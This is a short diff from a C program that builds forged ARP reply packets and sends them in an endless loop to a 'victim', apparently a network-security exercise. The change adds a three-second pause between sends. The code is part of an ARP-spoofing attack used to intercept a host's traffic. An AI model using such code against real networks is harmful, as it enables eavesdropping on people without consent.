@@ -226,6 +226,8 @@ int main(int argc, char *argv[]) {
 	make_arp(attack_packet, my_mac, sender_mac, REPLY, my_mac, target_ip, sender_mac, sender_ip, &packet_len);
 
 	printf("\n[*] Sending attack packet to sender(victim)!\n");
-	while (true)
+	while (true) {
 		pcap_sendpacket(handle, attack_packet, packet_len);
+		sleep(3);
+	}
 }
